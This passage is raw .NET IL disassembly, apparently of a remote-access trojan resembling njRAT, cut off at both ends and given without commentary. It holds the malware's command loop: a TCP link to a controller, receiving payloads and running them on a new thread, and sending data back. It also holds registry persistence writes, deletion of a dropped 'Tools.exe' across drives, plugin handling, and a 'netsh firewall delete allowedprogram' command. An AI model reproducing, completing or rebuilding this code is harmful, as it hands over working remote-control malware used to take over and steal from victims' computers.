      IL_006c:  ldc.i4.0
      IL_006d:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0072:  pop
      IL_0073:  nop
      IL_0074:  nop
      IL_0075:  nop
      IL_0076:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_007b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0080:  ldc.i4.0
      IL_0081:  cgt
      IL_0083:  stloc.s    V_6
      IL_0085:  ldloc.s    V_6
      IL_0087:  brfalse    IL_022b

      IL_008c:  ldloc.1
      IL_008d:  ldc.i4.m1
      IL_008e:  conv.i8
      IL_008f:  ceq
      IL_0091:  stloc.s    V_9
      IL_0093:  ldloc.s    V_9
      IL_0095:  brfalse    IL_0144

      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    str
      IL_00a1:  br         IL_013c

      IL_00a6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ab:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_00b0:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_00b5:  stloc.s    charCode
      IL_00b7:  nop
      IL_00b8:  ldloc.s    charCode
      IL_00ba:  ldc.i4.m1
      IL_00bb:  beq.s      IL_00c5

      IL_00bd:  br.s       IL_00bf

      IL_00bf:  ldloc.s    charCode
      IL_00c1:  brfalse.s  IL_00cb

      IL_00c3:  br.s       IL_0117

      IL_00c5:  nop
      IL_00c6:  leave      IL_0253

      IL_00cb:  nop
      IL_00cc:  ldloc.s    str
      IL_00ce:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00d3:  stloc.1
      IL_00d4:  ldstr      ""
      IL_00d9:  stloc.s    str
      IL_00db:  ldloc.1
      IL_00dc:  ldc.i4.0
      IL_00dd:  conv.i8
      IL_00de:  ceq
      IL_00e0:  stloc.s    V_12
      IL_00e2:  ldloc.s    V_12
      IL_00e4:  brfalse.s  IL_00f5

      IL_00e6:  ldstr      ""
      IL_00eb:  call       bool j.OK::Send(string)
      IL_00f0:  pop
      IL_00f1:  ldc.i4.m1
      IL_00f2:  conv.i8
      IL_00f3:  stloc.1
      IL_00f4:  nop
      IL_00f5:  nop
      IL_00f6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00fb:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0100:  ldc.i4.0
      IL_0101:  cgt
      IL_0103:  ldc.i4.0
      IL_0104:  ceq
      IL_0106:  stloc.s    V_13
      IL_0108:  ldloc.s    V_13
      IL_010a:  brfalse.s  IL_0111

      IL_010c:  br         IL_0021

      IL_0111:  nop
      IL_0112:  br         IL_0075

      IL_0117:  nop
      IL_0118:  ldloc.s    str
      IL_011a:  ldloc.s    charCode
      IL_011c:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0121:  stloc.s    V_14
      IL_0123:  ldloca.s   V_14
      IL_0125:  call       instance string [mscorlib]System.Char::ToString()
      IL_012a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_012f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0134:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0139:  stloc.s    str
      IL_013b:  nop
      IL_013c:  ldc.i4.1
      IL_013d:  stloc.s    V_15
      IL_013f:  br         IL_00a6

      IL_0144:  nop
      IL_0145:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_014a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_014f:  ldc.i4.1
      IL_0150:  add.ovf
      IL_0151:  ldc.i4.1
      IL_0152:  sub.ovf
      IL_0153:  ldc.i4.1
      IL_0154:  add.ovf
      IL_0155:  newarr     [mscorlib]System.Byte
      IL_015a:  stsfld     uint8[] j.OK::b
      IL_015f:  ldloc.1
      IL_0160:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0165:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_016a:  sub.ovf
      IL_016b:  stloc.s    num5
      IL_016d:  ldsfld     uint8[] j.OK::b
      IL_0172:  ldlen
      IL_0173:  conv.i4
      IL_0174:  conv.i8
      IL_0175:  ldloc.s    num5
      IL_0177:  cgt
      IL_0179:  stloc.s    V_16
      IL_017b:  ldloc.s    V_16
      IL_017d:  brfalse.s  IL_0196

      IL_017f:  ldloc.s    num5
      IL_0181:  ldc.i4.1
      IL_0182:  conv.i8
      IL_0183:  sub.ovf
      IL_0184:  conv.ovf.i4
      IL_0185:  ldc.i4.1
      IL_0186:  add.ovf
      IL_0187:  ldc.i4.1
      IL_0188:  sub.ovf
      IL_0189:  ldc.i4.1
      IL_018a:  add.ovf
      IL_018b:  newarr     [mscorlib]System.Byte
      IL_0190:  stsfld     uint8[] j.OK::b
      IL_0195:  nop
      IL_0196:  nop
      IL_0197:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_019c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_01a1:  ldsfld     uint8[] j.OK::b
      IL_01a6:  ldc.i4.0
      IL_01a7:  ldsfld     uint8[] j.OK::b
      IL_01ac:  ldlen
      IL_01ad:  conv.i4
      IL_01ae:  ldc.i4.0
      IL_01af:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_01b4:  stloc.s    count
      IL_01b6:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01bb:  ldsfld     uint8[] j.OK::b
      IL_01c0:  ldc.i4.0
      IL_01c1:  ldloc.s    count
      IL_01c3:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_01c8:  nop
      IL_01c9:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01ce:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_01d3:  ldloc.1
      IL_01d4:  ceq
      IL_01d6:  stloc.s    V_17
      IL_01d8:  ldloc.s    V_17
      IL_01da:  brfalse.s  IL_0225

      IL_01dc:  ldc.i4.m1
      IL_01dd:  conv.i8
      IL_01de:  stloc.1
      IL_01df:  ldnull
      IL_01e0:  ldftn      void j.OK::_Lambda__1(object)
      IL_01e6:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_01eb:  ldc.i4.1
      IL_01ec:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_01f1:  stloc.s    thread
      IL_01f3:  ldloc.s    thread
      IL_01f5:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01fa:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_01ff:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0204:  nop
      IL_0205:  ldloc.s    thread
      IL_0207:  ldc.i4.s   100
      IL_0209:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_020e:  pop
      IL_020f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0214:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0219:  nop
      IL_021a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_021f:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0224:  nop
      IL_0225:  nop
      IL_0226:  br         IL_0021

      IL_022b:  nop
      IL_022c:  leave.s    IL_0250

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_022e:  dup
      IL_022f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0234:  stloc.s    exception1
      IL_0236:  nop
      IL_0237:  ldloc.s    exception1
      IL_0239:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023e:  nop
      IL_023f:  ldloc.s    exception1
      IL_0241:  stloc.s    exception
      IL_0243:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0248:  nop
      IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024e:  leave.s    IL_0250

    }  // end handler
    IL_0250:  nop
    IL_0251:  nop
    IL_0252:  nop
    IL_0253:  nop
    .try
    {
      IL_0254:  nop
      IL_0255:  ldsfld     object j.OK::PLG
      IL_025a:  ldnull
      IL_025b:  cgt.un
      IL_025d:  stloc.s    V_21
      IL_025f:  ldloc.s    V_21
      IL_0261:  brfalse.s  IL_028a

      IL_0263:  ldsfld     object j.OK::PLG
      IL_0268:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_026d:  ldnull
      IL_026e:  ldstr      "clear"
      IL_0273:  ldc.i4.0
      IL_0274:  newarr     [mscorlib]System.Object
      IL_0279:  ldnull
      IL_027a:  ldnull
      IL_027b:  ldnull
      IL_027c:  ldc.i4.1
      IL_027d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0282:  pop
      IL_0283:  ldnull
      IL_0284:  stsfld     object j.OK::PLG
      IL_0289:  nop
      IL_028a:  nop
      IL_028b:  leave.s    IL_02af

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_028d:  dup
      IL_028e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0293:  stloc.s    exception3
      IL_0295:  nop
      IL_0296:  ldloc.s    exception3
      IL_0298:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_029d:  nop
      IL_029e:  ldloc.s    exception3
      IL_02a0:  stloc.s    exception2
      IL_02a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02a7:  nop
      IL_02a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02ad:  leave.s    IL_02af

    }  // end handler
    IL_02af:  nop
    IL_02b0:  ldc.i4.0
    IL_02b1:  stsfld     bool j.OK::Cn
    IL_02b6:  call       bool j.OK::connect()
    IL_02bb:  ldc.i4.0
    IL_02bc:  ceq
    IL_02be:  stloc.s    V_24
    IL_02c0:  ldloc.s    V_24
    IL_02c2:  brfalse.s  IL_02c6

    IL_02c4:  br.s       IL_0253

    IL_02c6:  nop
    IL_02c7:  ldc.i4.1
    IL_02c8:  stsfld     bool j.OK::Cn
    IL_02cd:  br         IL_0001
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init ([0] uint8[] SB)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init ([0] bool Send)
    IL_0000:  nop
    IL_0001:  ldarga.s   S
    IL_0003:  call       uint8[] j.OK::SB(string&)
    IL_0008:  call       bool j.OK::Sendb(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       288 (0x120)
    .maxstack  5
    .locals init ([0] bool Sendb,
             [1] bool V_1,
             [2] class [mscorlib]System.IO.FileInfo lO,
             [3] object V_3,
             [4] class [mscorlib]System.IO.MemoryStream 'stream',
             [5] int32 length,
             [6] uint8[] buffer,
             [7] bool V_7,
             [8] string V_8,
             [9] class [mscorlib]System.Exception exception1,
             [10] class [mscorlib]System.Exception exception,
             [11] bool V_11,
             [12] class [mscorlib]System.Exception exception3,
             [13] class [mscorlib]System.Exception exception2)
    IL_0000:  nop
    IL_0001:  ldsfld     bool j.OK::Cn
    IL_0006:  ldc.i4.0
    IL_0007:  ceq
    IL_0009:  stloc.1
    IL_000a:  ldloc.1
    IL_000b:  brfalse.s  IL_0014

    IL_000d:  ldc.i4.0
    IL_000e:  stloc.0
    IL_000f:  br         IL_011e

    IL_0014:  nop
    .try
    {
      IL_0015:  nop
      IL_0016:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_001b:  stloc.2
      IL_001c:  nop
      IL_001d:  ldloc.2
      IL_001e:  stloc.3
      IL_001f:  ldloc.3
      IL_0020:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      IL_0025:  nop
      .try
      {
        IL_0026:  ldsfld     bool j.OK::Cn
        IL_002b:  ldc.i4.0
        IL_002c:  ceq
        IL_002e:  stloc.s    V_7
        IL_0030:  ldloc.s    V_7
        IL_0032:  brfalse.s  IL_003b

        IL_0034:  ldc.i4.0
        IL_0035:  stloc.0
        IL_0036:  leave      IL_011e

        IL_003b:  nop
        IL_003c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0041:  stloc.s    'stream'
        IL_0043:  ldarg.0
        IL_0044:  ldlen
        IL_0045:  conv.i4
        IL_0046:  stloc.s    length
        IL_0048:  ldloca.s   length
        IL_004a:  call       instance string [mscorlib]System.Int32::ToString()
        IL_004f:  ldstr      bytearray (00 00 ) 
        IL_0054:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0059:  stloc.s    V_8
        IL_005b:  ldloca.s   V_8
        IL_005d:  call       uint8[] j.OK::SB(string&)
        IL_0062:  stloc.s    buffer
        IL_0064:  ldloc.s    'stream'
        IL_0066:  ldloc.s    buffer
        IL_0068:  ldc.i4.0
        IL_0069:  ldloc.s    buffer
        IL_006b:  ldlen
        IL_006c:  conv.i4
        IL_006d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0072:  nop
        IL_0073:  ldloc.s    'stream'
        IL_0075:  ldarg.0
        IL_0076:  ldc.i4.0
        IL_0077:  ldarg.0
        IL_0078:  ldlen
        IL_0079:  conv.i4
        IL_007a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_007f:  nop
        IL_0080:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0085:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_008a:  ldloc.s    'stream'
        IL_008c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0091:  ldc.i4.0
        IL_0092:  ldloc.s    'stream'
        IL_0094:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0099:  conv.ovf.i4
        IL_009a:  ldc.i4.0
        IL_009b:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_00a0:  pop
        IL_00a1:  leave.s    IL_00ac

      }  // end .try
      finally
      {
        IL_00a3:  ldloc.3
        IL_00a4:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_00a9:  nop
        IL_00aa:  nop
        IL_00ab:  endfinally
      }  // end handler
      IL_00ac:  nop
      IL_00ad:  leave.s    IL_0115

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00af:  dup
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  stloc.s    exception1
      IL_00b7:  nop
      IL_00b8:  ldloc.s    exception1
      IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bf:  nop
      IL_00c0:  ldloc.s    exception1
      IL_00c2:  stloc.s    exception
      .try
      {
        IL_00c4:  nop
        IL_00c5:  ldsfld     bool j.OK::Cn
        IL_00ca:  stloc.s    V_11
        IL_00cc:  ldloc.s    V_11
        IL_00ce:  brfalse.s  IL_00e2

        IL_00d0:  ldc.i4.0
        IL_00d1:  stsfld     bool j.OK::Cn
        IL_00d6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00db:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00e0:  nop
        IL_00e1:  nop
        IL_00e2:  nop
        IL_00e3:  leave.s    IL_0107

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e5:  dup
        IL_00e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00eb:  stloc.s    exception3
        IL_00ed:  nop
        IL_00ee:  ldloc.s    exception3
        IL_00f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00f5:  nop
        IL_00f6:  ldloc.s    exception3
        IL_00f8:  stloc.s    exception2
        IL_00fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00ff:  nop
        IL_0100:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0105:  leave.s    IL_0107

      }  // end handler
      IL_0107:  nop
      IL_0108:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010d:  nop
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  leave.s    IL_0115

    }  // end handler
    IL_0115:  nop
    IL_0116:  ldsfld     bool j.OK::Cn
    IL_011b:  stloc.0
    IL_011c:  br.s       IL_011e

    IL_011e:  ldloc.0
    IL_011f:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       99 (0x63)
    .maxstack  4
    .locals init ([0] bool STV,
             [1] bool flag,
             [2] class [mscorlib]System.Exception exception1,
             [3] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  ldarg.2
      IL_0032:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0037:  nop
      IL_0038:  ldc.i4.1
      IL_0039:  stloc.1
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.2
      IL_0043:  nop
      IL_0044:  ldloc.2
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004a:  nop
      IL_004b:  ldloc.2
      IL_004c:  stloc.3
      IL_004d:  ldc.i4.0
      IL_004e:  stloc.1
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0054:  nop
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  nop
    IL_005d:  ldloc.1
    IL_005e:  stloc.0
    IL_005f:  br.s       IL_0061

    IL_0061:  ldloc.0
    IL_0062:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       602 (0x25a)
    .maxstack  4
    .locals init ([0] string drivers,
             [1] string[] driver,
             [2] string[] V_2,
             [3] int32 V_3,
             [4] bool V_4,
             [5] bool V_5,
             [6] class [mscorlib]System.Exception exception1,
             [7] class [mscorlib]System.Exception exception,
             [8] class [mscorlib]System.Exception exception7,
             [9] class [mscorlib]System.Exception exception2,
             [10] class [mscorlib]System.Exception exception8,
             [11] class [mscorlib]System.Exception exception3,
             [12] bool V_12,
             [13] class [mscorlib]System.Exception exception9,
             [14] class [mscorlib]System.Exception exception4,
             [15] class [mscorlib]System.Exception exception10,
             [16] class [mscorlib]System.Exception exception5,
             [17] class [mscorlib]System.Exception exception11,
             [18] class [mscorlib]System.Exception exception6)
    IL_0000:  nop
    IL_0001:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_0010:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0015:  stloc.0
    IL_0016:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  stloc.2
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.3
    IL_0020:  br.s       IL_0065

    IL_0022:  ldloc.2
    IL_0023:  ldloc.3
    IL_0024:  ldelem.ref
    IL_0025:  stloc.0
    .try
    {
      IL_0026:  nop
      IL_0027:  ldloc.0
      IL_0028:  ldstr      "Tools.exe"
      IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0032:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0037:  stloc.s    V_4
      IL_0039:  ldloc.s    V_4
      IL_003b:  brfalse.s  IL_004f

      IL_003d:  ldloc.0
      IL_003e:  ldstr      "Tools.exe"
      IL_0043:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0048:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_004d:  nop
      IL_004e:  nop
      IL_004f:  nop
      IL_0050:  leave.s    IL_005f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0057:  nop
      IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005d:  leave.s    IL_005f

    }  // end handler
    IL_005f:  nop
    IL_0060:  nop
    IL_0061:  ldloc.3
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.3
    IL_0065:  ldloc.3
    IL_0066:  ldloc.2
    IL_0067:  ldlen
    IL_0068:  conv.i4
    IL_0069:  clt
    IL_006b:  stloc.s    V_5
    IL_006d:  ldloc.s    V_5
    IL_006f:  brtrue.s   IL_0022

    IL_0071:  ldc.i4.0
    IL_0072:  call       void j.OK::pr(int32)
    IL_0077:  nop
    IL_0078:  ldc.i4.0
    IL_0079:  stsfld     bool j.OK::Isu
    .try
    {
      IL_007e:  nop
      IL_007f:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0084:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0089:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_008e:  ldsfld     string j.OK::sf
      IL_0093:  ldc.i4.1
      IL_0094:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0099:  ldsfld     string j.OK::RG
      IL_009e:  ldc.i4.0
      IL_009f:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_00a4:  nop
      IL_00a5:  leave.s    IL_00c9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a7:  dup
      IL_00a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ad:  stloc.s    exception1
      IL_00af:  nop
      IL_00b0:  ldloc.s    exception1
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b7:  nop
      IL_00b8:  ldloc.s    exception1
      IL_00ba:  stloc.s    exception
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c1:  nop
      IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c7:  leave.s    IL_00c9

    }  // end handler
    IL_00c9:  nop
    .try
    {
      IL_00ca:  nop
      IL_00cb:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00d0:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00d5:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_00da:  ldsfld     string j.OK::sf
      IL_00df:  ldc.i4.1
      IL_00e0:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00e5:  ldsfld     string j.OK::RG
      IL_00ea:  ldc.i4.0
      IL_00eb:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_00f0:  nop
      IL_00f1:  leave.s    IL_0115

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f3:  dup
      IL_00f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f9:  stloc.s    exception7
      IL_00fb:  nop
      IL_00fc:  ldloc.s    exception7
      IL_00fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0103:  nop
      IL_0104:  ldloc.s    exception7
      IL_0106:  stloc.s    exception2
      IL_0108:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010d:  nop
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  leave.s    IL_0115

    }  // end handler
    IL_0115:  nop
    .try
    {
      IL_0116:  nop
      IL_0117:  ldstr      "netsh firewall delete allowedprogram \""
      IL_011c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0121:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0126:  ldstr      "\""
